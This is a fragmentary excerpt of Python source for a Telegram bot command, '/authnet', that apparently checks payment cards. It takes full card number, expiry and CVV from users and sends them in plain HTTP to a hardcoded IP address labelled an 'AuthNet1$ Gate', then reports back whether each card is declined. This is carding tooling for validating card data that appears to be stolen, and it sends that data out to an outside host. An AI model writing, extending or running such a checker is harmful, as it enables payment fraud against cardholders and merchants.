...
async def check_authnet1(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"http://135.148.14.205:5000/authnet1$?cc={fullcc}"
    try:
        ...
        # Map decline response message to "Transaction declined"
        if "this transaction has been declined" in message_resp.lower():
            mapped_response = "Transaction declined"
        else:
...
@Client.on_message(filters.command("authnet", [".", "/"]))
async def authnet1_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(client, message)
        gateway = "AuthNet1$ Gate"
...
Usage: /authnet1 cc|mes|ano|cvv</b>"""
...
"""
        ...
        firstmsg = await message.reply_text(first_response, message.id)
...
"""
        await asyncio.sleep(0.5)
        secondmsg = await client.edit_message_text(message.chat.id, firstmsg.id, second_response)

        start = time.perf_counter()
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
            result = await check_authnet1(fullcc, session)
...
"""
        await asyncio.sleep(0.5)
        thirdmsg = await client.edit_message_text(message.chat.id, secondmsg.id, third_response)
...
"""
        await asyncio.sleep(0.5)
        await client.edit_message_text(message.chat.id, thirdmsg.id, final_response)
